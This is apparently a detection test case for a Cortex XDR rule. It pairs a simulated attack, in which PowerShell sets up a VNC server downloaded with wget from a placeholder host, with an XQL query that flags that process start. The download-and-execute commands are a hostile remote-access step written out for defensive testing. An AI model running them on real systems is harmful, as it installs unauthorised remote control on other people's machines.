identity.summary: An attacker uses PowerShell to download and execute a VNC server binary, establishing remote access capabilities. Cortex should detect the rare process start of a VNC-related executable with network a
identity.description: An attacker uses PowerShell to download and execute a VNC server binary, establishing remote access capabilities. Cortex should detect the rare process start of a VNC-related executable with network activity.

payload.code:
mkdir C:\temp
wget https://example.com/vncserver.exe -O C:\temp\vncserver.exe
stub C:\temp\vncserver.exe
powershell -Command "Start-Process -FilePath C:\temp\vncserver.exe -ArgumentList '/register'"

biocs.name: Rare process with VNC server capabilities started
biocs.description: Detection of a rare process named like a VNC server being started
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'vncserver.exe'
| filter actor_process_image_name = 'powershell.exe'
